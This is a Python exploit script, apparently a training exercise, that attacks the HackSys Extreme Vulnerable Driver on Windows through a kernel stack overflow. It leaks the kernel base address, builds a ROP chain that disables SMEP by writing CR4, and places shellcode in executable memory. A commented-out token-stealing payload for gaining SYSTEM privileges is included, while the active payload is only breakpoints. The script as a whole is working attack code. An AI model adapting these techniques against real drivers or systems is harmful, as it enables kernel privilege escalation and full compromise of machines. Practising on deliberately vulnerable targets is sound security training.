from ctypes import *
from ctypes.wintypes import *
import sys, struct, time, os

#Define bitmasks/constants
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

IOCTL = 0x222003

# Define WinAPI
CreateProcess = windll.kernel32.CreateProcessW
CreateFile = windll.kernel32.CreateFileW
EnumDeviceDrivers = windll.psapi.EnumDeviceDrivers
GetDeviceDriverBaseName = windll.psapi.GetDeviceDriverBaseNameA
CloseHandle = windll.kernel32.CloseHandle
DeviceIoControl = windll.kernel32.DeviceIoControl
VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory

CloseHandle.restype = BOOL
CloseHandle.argtypes = [HANDLE]
VirtualAlloc.restype = c_void_p
DeviceIoControl.restype = BOOL

# we won't use LPOVERLAPPED (arg 8) so just use LPVOID
DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, LPVOID,
                            LPVOID, LPVOID]

class STARTUPINFO(Structure):
    """STARTUPINFO struct for CreateProcess API"""

    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    """ PROCESS_INFORMATION struct for CreateProcess API """

    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

def process_create():
    """ Spawn a command shell and return its PID """
    #print("[+] Spawning a shell...")
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe"
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe"
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    dwCreationFlags = CREATE_NEW_CONSOLE

    ret = CreateProcess(lpApplicationName,lpCommandLine,lpProcessAttributes,lpThreadAttributes,bInheritHandles,dwCreationFlags,lpEnvironment,lpCurrentDirectory,byref(lpStartupInfo),byref(lpProcessInformation))

    if not ret:
        print("[-]Error spawning shell:" + FormatError())
        sys.exit(-1)
    
    time.sleep(1)
    print("[+] Spawnd cmd.exe with PID: {}".format(lpProcessInformation.dwProcessId))
    return lpProcessInformation.dwProcessId

def gethandle():
    """ Get handle to the HEVD driver """
    #print("[+] Get handle to the driver...")
    lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None
    handle = CreateFile(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile)

    if not handle or handle == -1:
        print("[-] Error getting the handle:" + FormatError())
        sys.exit(-1)

    print("[+] Got device handle: 0x{}".format(handle))
    return handle

def createbuffer():
    return create_string_buffer(b"A"* 2072)

def findkernelbase():
    """ Find the Kernel Base address via medium integrity process """
    """ 
    BOOL EnumDeviceDrivers(LPVOID  *lpImageBase, DWORD   cb, LPDWORD lpcbNeeded);
    """
    array = c_ulonglong * 1024
    lpImageBase = array()
    cb = sizeof(lpImageBase)
    lpcbNeeded = c_long()
    drivername_size = c_longlong()
    drivername_size.value = 48
    driverName = create_string_buffer(256)
    #print("[+] Enumerating drivers...")

    base = EnumDeviceDrivers(byref(lpImageBase),cb,byref(lpcbNeeded))

    if not base:
        print("[-] Unable to enumerate drivers:" + FormatError())
        sys.exit(-1)
    
    GetDeviceDriverBaseName(LPVOID(lpImageBase[0]),driverName,drivername_size.value)
    print("[+] Found {} address at: {}".format(driverName.value.decode(), hex(lpImageBase[0])))
    return lpImageBase[0]

if __name__ == "__main__":
    #pid = process_create()
    hdev = gethandle()
    base_addr = findkernelbase()
    pid = os.getpid()
    hpid = hex(os.getpid())
    print("[+] Current PID is {} {}".format(pid,hpid))

    #token = b'\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\x48\x04\x00\x00\x48\x81\xEB\x48\x04\x00\x00\x48\x8B\x8B\x40\x04\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\xB8\x04\x00\x00\x80\xE1\xF0\x48\x89\x88\xB8\x04\x00\x00\x48\x31\xF6\x48\x31\xFF\xC3'
    token = b'\xCC\xCC\xC3'

    payload = create_string_buffer(token)

    # Allocate memory for payload in User land
    paddress = VirtualAlloc(
        c_int(0), 
        c_int(len(payload)), 
        c_int(0x3000), 
        c_int(0x40)
    )

    # Copying payload to user-land
    RtlMoveMemory(
    c_void_p(paddress),                 # Destination (pointer)
    payload,                            # Source (pointer)
    c_int(len(payload))                 # Length
    )

    print("[+] Payload buffer in userland allocated at {}".format(hex(paddress)))

    """ 
    ROP Gadgets
    0x140 205dbc: pop rcx ; ret  ;  (1 found)
                  0x002506f8  
    0x140 39dc17: mov cr4, ecx ; ret  ;  (1 found)
    """
    
    rop   = struct.pack("<Q",base_addr + 0x205dbc)
    rop  += struct.pack("<Q",0x002506f8)
    rop  += struct.pack("<Q",base_addr + 0x39dc17)
    
    shellcode_addr = struct.pack("<Q", paddress)
    
    shellcode = create_string_buffer(b"A"* 2072 + rop + shellcode_addr)
    #shellcode = create_string_buffer(b'A'*100)

    """     
    print("[+] Shellcode size is {} bytes".format(len(shellcode)))
    #print("[+] First gadget is at {}".format(hex(rop)))

    lpAddress = 0
    dwSize = len(shellcode)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE
    
    addr = VirtualAlloc(
        c_int(0), 
        c_int(len(shellcode)), 
        c_int(0x3000), 
        c_int(0x40)
    )

    if not addr:
        print("[-] Error allocating shellcode: " + FormatError())
        sys.exit(-1)
    
    print("[+] Shellcode buffer allocated at {}".format(hex(addr)))

    RtlMoveMemory(
    c_void_p(addr),                       # Destination (pointer)
    shellcode,                            # Source (pointer)
    c_int(len(shellcode))                 # Length
    ) """

    input("Press any key to crash the driver :)")

    """  
    outbuf = shellcode
    outbuf_len = len(shellcode)
    outbuf = LPSTR(b"\x00" * outbuf_len) if outbuf_len else None
    outret = DWORD() 
    """

    #print("Buffer size is {}".format(len(myBuffer)))
    #print("nIOCTL: 0x{:x}".format(IOCTL))
    #print("Input buffer: {}".format(myBuffer))

    DeviceIoControl(hdev, IOCTL, shellcode, len(shellcode), None , None, None, None)

    #DeviceIoControl(hdev, IOCTL, shellcode, len(shellcode), outbuf, outbuf_len, byref(outret), None)
    
    CloseHandle(hdev)
